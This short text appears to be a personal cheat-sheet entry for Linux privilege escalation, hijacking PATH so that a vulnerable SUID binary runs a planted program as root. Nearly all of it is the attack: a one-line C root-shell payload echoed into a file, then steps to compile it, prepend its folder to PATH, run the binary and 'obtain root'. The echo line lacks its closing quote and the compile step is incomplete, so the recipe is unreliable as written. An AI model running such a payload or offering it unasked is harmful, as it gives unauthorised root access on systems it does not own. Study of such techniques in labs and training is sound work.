// this is contingent on a vulnerable binary in Linux with the Owner Permission SUID set to 'rws' 
// this allows for execution of said vulnerable binary as root
// create a simple C file for linux priv esc that will execute when $PATH of vulnerabl env variable is called



echo 'int main () { setgid(0); setuid(0); system("/bin/bash"); return 0;} > /dir_where_$PATH_goes_to_execute_vulnerable_bin/name_of_file.c



// compile file: gcc /dir_where_$PATH_goes_to_execute_vulnerable_bin/name_of_file.c
// update the env variable of $PATH to the folder of our malicious file: export PATH=/dir_where_$PATH_goes_to_execute_vulnerable_bin:$PATH
// run the file path of the vulnerable binary on the CLI: /usr/local/bin/vulnerable_bin
// obtain root
